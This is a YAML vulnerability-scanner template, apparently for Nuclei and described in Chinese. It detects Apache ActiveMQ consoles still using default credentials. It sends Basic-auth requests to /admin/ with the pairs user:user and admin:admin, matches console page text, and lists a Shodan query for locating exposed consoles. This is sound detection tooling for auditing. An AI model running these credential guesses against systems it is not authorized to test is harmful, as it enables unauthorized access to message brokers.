id: activemq-default-login

info:
  name: Apache ActiveMQ 默认口令登录（弱口令）
  author: pdteam
  severity: high
  description: 该模板通过尝试 Apache ActiveMQ 的默认账号口令，并依据认证成功后的响应特征判断目标是否仍在使用未修改的弱口令。若命中，攻击者可直接登录系统，进一步访问敏感信息、修改配置或执行未授权操作。
  reference:
    - https://github.com/apache/activemq-artemis/
  metadata:
    product: activemq
    vendor: apache
    max-request: 2
    shodan-query: title:"ActiveMQ Artemis Console"
  tags: apache,activemq,default-login,vuln

http:
  - raw:
      - |
        GET /admin/ HTTP/1.1
        Host: {{Hostname}}
        Authorization: Basic {{base64(username + ':' + password)}}

    payloads:
      username:
        - user
        - admin
      password:
        - user
        - admin
    attack: pitchfork
    matchers:
      - type: word
        words:
          - 'Welcome to the Apache ActiveMQ Console of <b>'
          - '<h2>Broker</h2>'
        condition: and
